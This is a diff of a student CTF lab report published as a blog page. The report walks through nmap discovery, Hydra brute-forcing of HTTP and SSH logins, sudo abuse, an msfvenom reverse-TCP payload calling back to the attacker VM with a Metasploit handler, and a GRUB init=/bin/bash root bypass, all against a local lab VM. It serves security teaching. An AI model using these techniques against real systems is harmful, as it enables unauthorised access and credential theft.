@@ -1,11 +1,12 @@
 +++
 date = '2025-01-20T03:33:09+01:00'
-title = 'Babys first CTF'
-categories = ["school", "it sec"]
-tags = ["linux","it sec","school","red team","ctf"]
+title = "Baby's First CTF"
+description = 'A documented CTF walkthrough covering network discovery, service enumeration, credential attacks, and Linux exploitation.'
+categories = ["school", "it-sec"]
+tags = ["linux", "it-sec", "school", "red-team", "ctf"]
 +++
 
-> Note: this was converted from LaTeX to Markdown using ChatGPT 4.1. The original PDF can be found [here](https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex7/UE7_CTF.pdf) along with the [bibliography](https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex7/quellen.bib).
+> This is an HTL Donaustadt laboratory report converted from the original document. The [original PDF](https://github.com/0xveya/goobering/blob/master/itsi/y3/ex7/UE7_CTF.pdf) and [bibliography](https://github.com/0xveya/goobering/blob/master/itsi/y3/ex7/quellen.bib) are available on GitHub.
 
 ---
 
@@ -15,11 +16,10 @@ tags = ["linux","it sec","school","red team","ctf"]
 
 **Laboratory protocol**  
 Exercise 7: Ethical hacking of a CTF-VM  
-{{< figure src="/itsi/y3/ex7/images/menheraMagnifier.png" title="Figure: Grouplogo" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/menheraMagnifier.png" title="Original report cover image" >}}
 **Subject:** ITSI  
 **Class:** 3AHITN  
-**Name:** Stefan Fürst, Justin Tremurici  
-**Group Name/Number:** todo/12  
+**Name:** Veya Fürst, Justin Tremurici  
 **Supervisor:** SPAC, ZIVK  
 **Exercise dates:** 17-19.1.2025  
 **Submission date:** 20.1.2025
@@ -77,7 +77,7 @@ We attempted to gain root access using the Linux Smart Enumeration tool and by a
 
 ## Complete network topology of the exercise
 
-{{< figure src="/itsi/y3/ex7/images/topo.png" title="Figure 1: Complete network topology of the exercise" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/topo.png" title="Figure 1: Complete network topology of the exercise" >}}
 
 ---
 
@@ -87,15 +87,15 @@ We attempted to gain root access using the Linux Smart Enumeration tool and by a
 
 To get started with this CTF, make sure that VirtualBox version 7.1.4 is used. The VM to attack must be imported by double-clicking the provided `.ova` file. After the import is complete, the network settings must be changed to use Host-only Adapter mode. Since using the default Host-only network did not work, we had to create a new Host-only network. To do this, either press `<C-h>` or click on `File > Tools > Network Manager`, as shown in Figure 2.
 
-{{< figure src="/itsi/y3/ex7/images/openingNetworkManager.png" title="Figure 2: Opening VirtualBox Network Manager settings" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/openingNetworkManager.png" title="Figure 2: Opening VirtualBox Network Manager settings" >}}
 
 In this menu, click on `Create`, then check the `Enable Server` box to enable the DHCP server so the target VM will receive an IP address. Then, click on `Adapter` to view the IP range of the network, which in our case is `192.168.15.0/24`, which can be seen in Figure 3.
 
-{{< figure src="/itsi/y3/ex7/images/nwipsfr.png" title="Figure 3: Showing the IP settings for the new Host-only network" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/nwipsfr.png" title="Figure 3: Showing the IP settings for the new Host-only network" >}}
 
 Next, open the virtual machine settings by selecting the VM in the list and pressing `<C-s>`. Under the `Network` section, change the network adapter to use the Host-only Adapter and select the VirtualBox Host-only Ethernet Adapter #2, which was just created. Perform this step for both the target VM and the Kali VM, as detailed in Figure 4.
 
-{{< figure src="/itsi/y3/ex7/images/vmnwconf.png" title="Figure 4: Showing the network configuration of the virtual machines" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/vmnwconf.png" title="Figure 4: Showing the network configuration of the virtual machines" >}}
 
 ---
 
@@ -103,13 +103,13 @@ Next, open the virtual machine settings by selecting the VM in the list and pres
 
 We use the Cyber Kill Chain to structure our steps for completing the CTF, with any attack beginning with reconnaissance, which in this case means scanning the network with `nmap`.<cite>Lockheed Martin[^2]</cite> Since we don't know the IP address of the target server yet, we need to scan the network to find it. For this, the command `nmap 192.168.15.0/24` is used to scan the entire network for open ports, as illustrated in Figure 5.
 
-{{< figure src="/itsi/y3/ex7/images/firstnmapscan.png" title="Figure 5: Results of the nmap scan" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/firstnmapscan.png" title="Figure 5: Results of the nmap scan" >}}
 
 We can determine that the target has the IP address `192.168.15.3`, since `.1` is the network address, `.2` is the DHCP server, and `.4` is the IP address of the Kali VM. This can be verified by running `ip a` or by scanning the open ports, since `ssh` is not exposed.
 
 Now we can run another `nmap` scan to get further information about the running services and their version by using the `-sV` flag and the `-T4` flag for aggressive timing, and the `-p-` value to scan all ports.<cite>Nmap Version Detection[^3]</cite><cite>Nmap Timing[^4]</cite> The results of the scan can be seen in Figure 6.
 
-{{< figure src="/itsi/y3/ex7/images/nmapfr.png" title="Figure 6: Results of the detailed nmap scan" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/nmapfr.png" title="Figure 6: Results of the detailed nmap scan" >}}
 
 From this scan, we can see that `ssh` and four `http` servers running Python 3.12.3 are active on the system.
 
@@ -119,11 +119,11 @@ From this scan, we can see that `ssh` and four `http` servers running Python 3.1
 
 If we open the websites in our web browser of choice, we can see that the one on port `1080` says that to get further, we need to scan deeper, which we already did. The website on port `5155` shows text from foreign languages, which is randomized and always prints out different text on refresh. The site on port `10458` prints out a message in `base64`, and lastly, the one on port `10448` has a basic authentication login prompt for a mini web shell. Figure 7 shows the content of each webpage.
 
-{{< figure src="/itsi/y3/ex7/images/allesiten.png" title="Figure 7: Showing the contents of each page using curl" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/allesiten.png" title="Figure 7: Showing the contents of each page using curl" >}}
 
 The `base64` message can be decoded by piping the string, using `echo`, into the `base64` command, which gives us the hint to use port `55487`, the site with authentication. This is shown in Figure 8.
 
-{{< figure src="/itsi/y3/ex7/images/base64.png" title="Figure 8: Decoding the base64 message" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/base64.png" title="Figure 8: Decoding the base64 message" >}}
 
 To get all the random variants from the site with the foreign languages, I wrote a quick batch script to recursively relay the website and save the output in a file called `output`, as shown in Figure 9.
 
@@ -136,11 +136,11 @@ while true;do
 done
 ```
 
-{{< figure src="/itsi/y3/ex7/images/gettextsh.png" title="Figure 9: Running the script" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/gettextsh.png" title="Figure 9: Running the script" >}}
 
 After running it for a while, we prompted ChatGPT with the list of outputs to translate, which revealed the following hint, as shown in Figure 10.
 
-{{< figure src="/itsi/y3/ex7/images/labngs.png" title="Figure 10: ChatGPT translating the hint" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/labngs.png" title="Figure 10: ChatGPT translating the hint" >}}
 
 ---
 
@@ -163,11 +163,11 @@ To brute force the password, the following `hydra` command will be used: `hydra 
 http-get / #specifying the service and method to use
 ```
 
-{{< figure src="/itsi/y3/ex7/images/hydra.png" title="Figure 11: Running the Hydra command to get the credentials" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/hydra.png" title="Figure 11: Running the Hydra command to get the credentials" >}}
 
 After entering the found credentials on the webpage, we get the first flag.
 
-{{< figure src="/itsi/y3/ex7/images/flag1.png" title="Figure 12: First flag found" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/flag1.png" title="Figure 12: First flag found" >}}
 
 ---
 
@@ -179,7 +179,7 @@ Besides the flag, there is a webshell on the site, so we can run commands on the
 
 To brute force the SSH login, this Hydra command is used: `hydra -l GrumpyCat -P pw.txt 192.168.15.3 ssh -t 4`.<cite>hydra-ssh[^7]</cite> The only changes made to the command are the username we got through the webshell, replacing the method with SSH, and using the `-t` flag with a value of 4 to set the max tasks to 4, since some SSH configurations tend to block higher counts. Figure 13 shows the command output.
 
-{{< figure src="/itsi/y3/ex7/images/hydrassh.png" title="Figure 13: Getting the credentials for the user GrumpyCat" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/hydrassh.png" title="Figure 13: Getting the credentials for the user GrumpyCat" >}}
 
 ---
 
@@ -189,11 +189,11 @@ To brute force the SSH login, this Hydra command is used: `hydra -l GrumpyCat -P
 
 Now that we have a shell in the server, it's time to dig around and explore. We started by running `ls -R / * 2>/dev/null | grep flag`, in which the `-R` flag is used to recursively list all the files in the root of the file system and the `*` is used to list everything inside that as well. Lastly, the `2>/dev/null` redirects `stderr` to the file `/dev/null` to effectively delete them from the output, which is piped into `grep` to filter it to search for files that have `flag` in their name.<cite>stderr[^8]</cite> To tidy up the output, it can be piped into `grep` again with the `-v` flag to exclude results that contain `flags`. Figure 14 shows the results.
 
-{{< figure src="/itsi/y3/ex7/images/searchingfor falgfiles.png" title="Figure 14: Output of the search command" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/searchingfor falgfiles.png" title="Figure 14: Output of the search command" >}}
 
 As we can see, we found a file called `secret_flag.txt` and `flag_process.sh`, for which we can search with the following command: `find -name "filename" / 2>/dev/null`. Figure 15 displays the found file locations.
 
-{{< figure src="/itsi/y3/ex7/images/findfiles.png" title="Figure 15: File locations of the 2 found files" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/findfiles.png" title="Figure 15: File locations of the 2 found files" >}}
 
 ---
 
@@ -201,7 +201,7 @@ As we can see, we found a file called `secret_flag.txt` and `flag_process.sh`, f
 
 With `ss -tulnp`, we can examine all listening process services on the system for TCP and UDP, along with the processes they use, if we have permission to see that.
 
-{{< figure src="/itsi/y3/ex7/images/sstunlp.png" title="Figure 16: Viewing the listening services" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/sstunlp.png" title="Figure 16: Viewing the listening services" >}}
 
 ---
 
@@ -209,7 +209,7 @@ With `ss -tulnp`, we can examine all listening process services on the system fo
 
 Let's return to the file `flag_process.sh` to get this flag. Simply cat the file as shown in Figure 17.
 
-{{< figure src="/itsi/y3/ex7/images/processflag.png" title="Figure 17: Viewing the check_running_processes flag" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/processflag.png" title="Figure 17: Viewing the check_running_processes flag" >}}
 
 ---
 
@@ -217,11 +217,11 @@ Let's return to the file `flag_process.sh` to get this flag. Simply cat the file
 
 Luckily, as seen in Figure 16, it appears that the webserver has been started as the current user, which we can further inspect with `ps aux | grep python`. As shown in Figure 18, the process has been started by the root user as GrumpyCat.
 
-{{< figure src="/itsi/y3/ex7/images/psauxpy.png" title="Figure 18: Inspecting the running Python processes" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/psauxpy.png" title="Figure 18: Inspecting the running Python processes" >}}
 
 If we read the file `/bin/ctf_server.py`, we first see that the ranges of the randomized port ranges are `4000-5600`, `10000-12000`, and `50000-60000`. The intended translation is "Hinweis1: Der Nutzername lautet user", and lastly, a flag hides itself at the bottom of the file, which is shown in Figure 19.
 
-{{< figure src="/itsi/y3/ex7/images/commentflag.png" title="Figure 19: Viewing the flag in the server Python file" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/commentflag.png" title="Figure 19: Viewing the flag in the server Python file" >}}
 
 ---
 
@@ -231,15 +231,15 @@ If we simply cat this file as the current user, we can't do that since we lack p
 
 To see all the users we can log into, we can search through the file using the following grep command: `grep -v "nologin" /etc/passwd`. With this command, we display all the lines of the `/etc/passwd` file that don't contain `nologin` to only display the users we can log in as.
 
-{{< figure src="/itsi/y3/ex7/images/usr.png" title="Figure 20: Listing the users we can log in as" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/usr.png" title="Figure 20: Listing the users we can log in as" >}}
 
 As seen in Figure 20, we got two new options as users to log in: `ubuntu` and `CheerfulOtter`. Since we had already tried brute-forcing the root password from the very start, just in case, and the user users have not set an interactive login shell, we chose `CheerfulOtter` because the name sounds more similar to `GrumpyCat`. We also brute-forced the `ubuntu` user in the background. This was a correct assumption, as the password for the `CheerfulOtter` user was also "password", and we didn't find the password for the `ubuntu` user, which also had its sudo permissions removed in the `remove_ubuntu_from_sudo()` function in the setup script.
 
-{{< figure src="/itsi/y3/ex7/images/cheerfulotpw.png" title="Figure 21: Getting the credentials for CheerfulOtter" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/cheerfulotpw.png" title="Figure 21: Getting the credentials for CheerfulOtter" >}}
 
 As seen in Figure 21, we got the credentials for the CheerfulOtter user. If we log in as that user and run `sudo -l` to see what permissions we have with sudo, we can see that the only command we can run elevated is `/bin/cat /opt/secret_flag.txt`, which we need in order to find the flag, as shown in Figure 22.
 
-{{< figure src="/itsi/y3/ex7/images/sh.png" title="Figure 22: Viewing secret_flag.txt" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/sh.png" title="Figure 22: Viewing secret_flag.txt" >}}
 
 ---
 
@@ -254,8 +254,8 @@ find / #Selecting the / directory to search in
 2>/dev/null #Hiding errors
 ```
 
-{{< figure src="/itsi/y3/ex7/images/fdtmp.png" title="Figure 23: Output of the find command" >}}
-{{< figure src="/itsi/y3/ex7/images/tmpfl.png" title="Figure 24: Viewing the flag in the /tmp directory" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/fdtmp.png" title="Figure 23: Output of the find command" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/tmpfl.png" title="Figure 24: Viewing the flag in the /tmp directory" >}}
 
 ---
 
@@ -263,8 +263,8 @@ find / #Selecting the / directory to search in
 
 Additionally to the find command, I remembered reading in a CTF cheat sheet a while ago to check the command history of the user. However, I initially only checked `.bash_history` instead of the `.history` file, which contains a flag in this CTF.<cite>enumeration-walkthough[^10]</cite> I always missed it until I ran `ls -l` as a sanity check in the home directory of CheerfulOtter and found the flag, as shown in Figures 25 and 26.
 
-{{< figure src="/itsi/y3/ex7/images/colsal.png" title="Figure 25: Viewing the home directories of CheerfulOtter" >}}
-{{< figure src="/itsi/y3/ex7/images/cofl.png" title="Figure 26: Viewing the flag in the .history file" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/colsal.png" title="Figure 25: Viewing the home directories of CheerfulOtter" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/cofl.png" title="Figure 26: Viewing the flag in the .history file" >}}
 
 ---
 
@@ -316,20 +316,20 @@ LPORT=4444 #sets the local port to listen for a connection
 -o payload.bin #specifies the output filename
 ```
 
-{{< figure src="/itsi/y3/ex7/images/msfgenpayload.png" title="Figure 27: Generating the payload using msfvenom" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/msfgenpayload.png" title="Figure 27: Generating the payload using msfvenom" >}}
 
 After this, the payload is uploaded to the target using scp, as demonstrated in Figure 28.
 
-{{< figure src="/itsi/y3/ex7/images/scp.png" title="Figure 28: Uploading the payload to the target" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/scp.png" title="Figure 28: Uploading the payload to the target" >}}
 
 The next step is to open the Metasploit console by running `msfconsole`. Set the exploit to `exploit/multi/handler`, the payload to `linux/x86/meterpreter/reverse_tcp`, the LHOST to `192.168.15.4`, and finally, run the command `run` to start the reverse TCP handler. After that, we execute the binary on the target, and we have a Meterpreter shell, as shown in Figures 29 and 30.
 
-{{< figure src="/itsi/y3/ex7/images/msfc.png" title="Figure 29: Running the necessary commands in the msfconsole" >}}
-{{< figure src="/itsi/y3/ex7/images/ep.png" title="Figure 30: Executing the payload on the target" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/msfc.png" title="Figure 29: Running the necessary commands in the msfconsole" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/ep.png" title="Figure 30: Executing the payload on the target" >}}
 
 Now that we have access to Meterpreter, we can use commands such as `getuid` to get the ID of the user and many other useful commands such as `upload` and `download`. However, as demonstrated in Figure 31, loading the priv module didn't work, so we were not able to test if `getsystem` would work to escalate the privileges.
 
-{{< figure src="/itsi/y3/ex7/images/RadagJuice.png" title="Figure 31: The required modules not being loaded" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/RadagJuice.png" title="Figure 31: The required modules not being loaded" >}}
 
 ---
 
@@ -341,16 +341,16 @@ To use this method, the system needs to be running the GRUB boot loader, which i
 
 It is performed by pressing `e` when seeing the screen shown in Figure 32, which brings up the menu to edit the boot commands.
 
-{{< figure src="/itsi/y3/ex7/images/pe.png" title="Figure 32: Showing the GRUB screen to press e on" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/pe.png" title="Figure 32: Showing the GRUB screen to press e on" >}}
 
 Then navigate to the line starting with `linux` and append `rw init=/bin/bash`, as shown in Figure 33, to change a kernel parameter. After pressing F10, you will immediately boot into the system with a root shell, as shown in Figure 34.
 
-{{< figure src="/itsi/y3/ex7/images/rw+.png" title="Figure 33: Editing a kernel parameter" >}}
-{{< figure src="/itsi/y3/ex7/images/pwc.png" title="Figure 34: Changing the root password" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/rw+.png" title="Figure 33: Editing a kernel parameter" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/pwc.png" title="Figure 34: Changing the root password" >}}
 
 Lastly, as displayed in Figure 34, we run the command `exec /sbin/init` to reboot the system and load into the operating system as usual. Figure 35 verifies this by showing the root login after rebooting.
 
-{{< figure src="/itsi/y3/ex7/images/ve.png" title="Figure 35: Logging in as the root user" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/ve.png" title="Figure 35: Logging in as the root user" >}}
 
 ---
 
@@ -358,19 +358,19 @@ Lastly, as displayed in Figure 34, we run the command `exec /sbin/init` to reboo
 
 Now that we are the root user, we can see a file called `root_flag.txt`, which contains the final flag. Additionally, we can view the file `ctf_setup.sh` to see how the CTF is made and verify that we actually got all of the flags this time. These files are also available in the ZIP file beside this document. Figure 36 shows the files in `/root` and the final flag.
 
-{{< figure src="/itsi/y3/ex7/images/ogm.png" title="Figure 36: Viewing the final flag in the /root directory" >}}
+{{< figure src="https://raw.githubusercontent.com/0xveya/goobering/master/itsi/y3/ex7/images/ogm.png" title="Figure 36: Viewing the final flag in the /root directory" >}}
 
 ---
 
 ## References
 
-*For a full bibliography, see the [original BibTeX file](https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex7/quellen.bib).*
+*For a full bibliography, see the [original BibTeX file](https://github.com/0xveya/goobering/blob/master/itsi/y3/ex7/quellen.bib).*
 
 [^1]: This task definition and summary were generated using ChatGPT from the original bullet points.
 [^2]: Lockheed Martin. Cyber Kill Chain®. [source](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html)
 [^3]: Nmap. Service and Version Detection. [source](https://nmap.org/book/man-version-detection.html)
 [^4]: Nmap. Timing Templates (-T). [source](https://nmap.org/book/performance-timing-templates.html)
-[^5]: 10-million-password-list-top-10000.txt. [source](https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt)
+[^5]: SecLists 10,000 most common passwords. [source](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt)
 [^6]: Code Zen. Defeating HTTP Basic Auth with Hydra. [source](https://tylerrockwell.github.io/defeating-basic-auth-with-hydra)
 [^7]: GeeksforGeeks. How to use Hydra to BruteForce SSH Connections? [source](https://www.geeksforgeeks.org/how-to-use-hydra-to-brute-force-ssh-connections)
 [^8]: Ask Ubuntu. What does 2>/dev/null mean? [source](https://askubuntu.com/questions/350208/what-does-2-dev-null-mean)
@@ -386,5 +386,3 @@ Now that we are the root user, we can see a file called `root_flag.txt`, which c
 [^18]: drd_. Null Byte. [source](https://null-byte.wonderhowto.com/how-to/get-root-with-metasploits-local-exploit-suggester-0199463)
 [^19]: Metasploit Documentation. How to use msfvenom. [source](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)
 [^20]: LinuxConfig. Recover - Reset Forgotten Linux Root Password. [source](https://linuxconfig.org/recover-reset-forgotten-linux-root-password)
-
-
